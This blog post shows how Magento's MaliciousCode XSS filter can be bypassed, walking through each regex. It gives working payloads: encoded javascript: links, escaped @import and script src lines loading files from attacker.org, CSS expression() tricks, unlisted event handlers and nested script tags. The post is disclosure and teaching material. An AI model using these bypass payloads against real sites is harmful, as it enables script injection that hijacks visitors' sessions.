---
layout: post
title: "Circumventing XSS filters"
thumbnail: water-pipe-240.jpg
---

XSS or cross site scripting is an attack where an hacker injects Javascript in a page that is then run by another visitor. To prevent this, some software tries to remove any Javascript from the input. This is pretty hard to implement correctly.  In this article I will show some code that tries to remove Javascript code from the input, and show several ways to circumvent this.

Take for example the class [`Mage_Core_Model_Input_Filter_MaliciousCode`](https://github.com/nexcess/magento/blob/master/app/code/core/Mage/Core/Model/Input/Filter/MaliciousCode.php)
from the webshop software [Magento](https://magento.com/). This class is meant to filter "malicious code", which means any way to insert Javascript. 

The code looks like this:

    protected $_expressions = array(
        '/(\/\*.*\*\/)/Us',
        '/(\t)/',
        '/(javascript\s*:)/Usi',
        '/(@import)/Usi',
        '/style=[^<]*((expression\s*?\([^<]*?\))|(behavior\s*:))[^<]*(?=\>)/Uis',
        '/(ondblclick|onclick|onkeydown|onkeypress|onkeyup|onmousedown|onmousemove|onmouseout|onmouseover|onmouseup|onload|onunload|onerror)=[^<]*(?=\>)/Uis',
        '/<\/?(script|meta|link|frame|iframe).*>/Uis',
        '/src=[^<]*base64[^<]*(?=\>)/Uis',
    );

    function filter($value) {
        return preg_replace($this->_expressions, '', $value);
    }

The variable `$_expressions` contains a list of regular expressions that are removed from the text by the `preg_replace`. So if you type `<script>foo</script>`, both tags will be removed and only `foo` will remain.

Let's look at ways to circumvent this filter. Our goal is to pass some HTML through it that executes Javascript. The filter has several expressions that are meant to prevent this:

| Filter regex | Possible exploit |
| ------------ | ---------------- |
| `(javascript\s*:)` | `<a href="javascript:alert('xss')">` |
| `@import` | `@import url(http://attacker.org/malicious.css)` |
| `style=…` | `<div style="color: expression(alert('XSS'))">` |
| `ondblclick|onclick|…` | `<div onclick="alert('xss')">` | 
| `<script…` | `<script>alert("XSS")</script>` |

## Javascript URL

A link can be made to run javascript by using `javascript:…` in the URL:

    <a href="javascript:alert('test')">link</a>

Our filter removes `javascript:` from the code, so we can't use the above code directly. We can try to change the `javascript:` part so that it is still executed by the browser, but doesn't exactly match the regex. Let's try to URL-encode a letter:

    <a href="java&#115;cript:alert('xss')">link</a>

The regex no longer matches, but the browser will still execute this because it does URL-decode the link before using it.

Besides Javascript there is also VBScript. It is deprecated and disabled in IE11, but works on older versions of Internet Explorer or if you put IE11 in IE10 emulation mode. We can use this to run some code in the same way as Javascript links:

    <a href='vbscript:MsgBox("XSS")'>link</a>

## CSS import

Internet Explorer supports Javascript expressions in CSS, called [dynamic properties](https://msdn.microsoft.com/en-us/library/ms537634(v=vs.85).aspx). Allowing an attacker to load an external CSS stylesheet would thus be dangerous, as the attacker can now run Javascript in the context of the original page.

    <style>
    @import url("http://attacker.org/malicious.css");
    </style>

And in malicious.css:

    body {
        color: expression(alert('XSS'));
    }

We can circumvent the `@import` filter by using a backslash escape character in the CSS:

    <style>
    @imp\ort url("http://attacker.org/malicious.css");
    </style>

Internet Explorer allows for the backslash and now it passes our filter.

## Inline style

We can also use the dynamic properties supported by Internet Explorer in inline style:

    <div style="color: expression(alert('XSS'))">

The filter will check for `style`, followed by anything that is not a `<`, followed by `expression`:

    /style=[^<]*((expression\s*?\([^<]*?\))|(behavior\s*:))[^<]*(?=\>)/Uis

So let's put a `<` somewhere in there:

    <div style="color: '<'; color: expression(alert('XSS'))">

This passes the filter because the `[^<]` does not match our `<`, and this is still valid CSS. Although `<` is not a valid color, the rest of the CSS is still used.


## Javascript events

One can define event handlers on an element like this:

    <div onclick="alert('xss')">

Now this Javascript would only be run when someone clicks on it, but there are also events that are triggered when the page loads or when the user moves his mouse. Many of these events are removed by the filter, but it simply does not contain all event handlers. For example, `onmouseenter` is missing:

    <div onmouseenter="alert('xss')">

Our code is run when the user moves his mouse onto the div.

Another way to circumvent this is to put a space between the attribute and the `=`. Magento fixed this in a later version of the MaliciousCode filter.

    <div onclick ="alert('xss')">

## Script tag

A script tag can be used to define inline script, or load a script file from another location:

    <script>alert("XSS")</script>
    <script src="http://attacker.org/malicious.js"></script>

Our filter removes any `<script>` tags. However, it only does so once, so we can make sure that the content that we want ends up after removing the tags:

    <scr<script>ipt>alert("XSS")</scr<script>ipt>

The filter removes the two occurences of `<script>`, and we end up with exactly the code that we want. In fact, this method of nesting tags can be used to circumvent any of filter expressions.

## Conclusion

Although the filter tries to block several methods of script injection, we found circumventions for all of them. It is not easy to create a filter to prevent XSS attacks. There are several types of encoding and a number of different browser behaviours you have to take into account. This makes it hard on the developer and easy on the attacker.

## Security implications

I have shown some ways to get Javascript through this filter anyway. This could be a security risk, except that this filter is never used with untrusted input. As can be read in the [Magento 2.0.1 release notes](https://magento.com/security/patches/magento-201-security-update):

> A user can easily bypass the MaliciousCode filter function when entering HTML code. However, Magento rarely uses this filter, and none of its current usages allow unauthenticated user input.

Furthermore, I contacted Magento on 23 January and they didn't consider this a security issue, so I felt free to publish this article.
